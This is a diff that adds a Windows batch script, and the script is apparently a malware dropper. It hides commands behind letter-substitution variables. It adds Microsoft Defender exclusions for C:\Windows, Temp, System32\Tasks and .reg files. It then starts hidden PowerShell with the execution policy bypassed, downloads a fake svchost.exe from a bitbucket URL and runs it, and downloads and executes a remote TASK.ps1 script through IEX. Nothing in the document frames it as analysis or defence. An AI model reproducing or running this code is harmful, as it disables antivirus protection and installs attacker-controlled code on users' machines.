@@ -1,0 +1,34 @@
+@echo off
+set lfommas=a
+set nftroas=b
+set hgjtppa=c
+set jkutand=d
+set hyrrhna=e
+set opuansl=f
+set hgyrpaw=g
+set yuroaps=h
+set nghspas=i
+set samsoki=j
+set vbnppsd=k
+set tyropol=l
+set olopaer=m
+set mamonat=n
+set kodaiso=o
+set satelio=p
+set gogimol=q
+set fhdnmsa=r
+set nvmsuff=s
+set abznskk=t
+set sugarra=u
+set qstansm=v
+set wellusa=w
+set opsnnse=x
+set nbnssoa=y
+set lokjmdd=z
+@%hyrrhna%%hgjtppa%%yuroaps%%kodaiso% %kodaiso%%opuansl%%opuansl%
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\System32\Tasks"
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".reg"
+C:\W%nghspas%%mamonat%%jkutand%%kodaiso%%wellusa%%nvmsuff%\S%nbnssoa%%nvmsuff%%abznskk%%hyrrhna%%olopaer%32\W%nghspas%%mamonat%%jkutand%%kodaiso%%wellusa%%nvmsuff%P%kodaiso%%wellusa%%hyrrhna%%fhdnmsa%S%yuroaps%%hyrrhna%%tyropol%%tyropol%\%qstansm%1.0\%satelio%%kodaiso%%wellusa%%hyrrhna%%fhdnmsa%%nvmsuff%%yuroaps%%hyrrhna%%tyropol%%tyropol%.%hyrrhna%%opsnnse%%hyrrhna% -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://bitbucket.org/dazlle/logos/downloads/svchost.exe','%TEMP%\svchost.exe'); cmd /c '%TEMP%\svchost.exe'
+C:\%wellusa%%nghspas%ND%kodaiso%%wellusa%S\Syst%hyrrhna%m32\%wellusa%%nghspas%ndowsP%kodaiso%%wellusa%%hyrrhna%rSh%hyrrhna%ll\v1.0\p%kodaiso%%wellusa%%hyrrhna%rsh%hyrrhna%ll.%hyrrhna%x%hyrrhna% -N%kodaiso%Pr -WINd 1 -%hyrrhna%XEc ByP $%wellusa%cl%nghspas% = ((N%hyrrhna%%wellusa%-Obj%hyrrhna%ct Syst%hyrrhna%m.N%hyrrhna%t.W%hyrrhna%bCl%nghspas%ent)).D%kodaiso%%wellusa%nl%kodaiso%adStr%nghspas%ng('h%abznskk%%abznskk%ps://bitbucket.org/dazlle/logos/downloads/TASK.ps1');IEX $%wellusa%cl%nghspas%
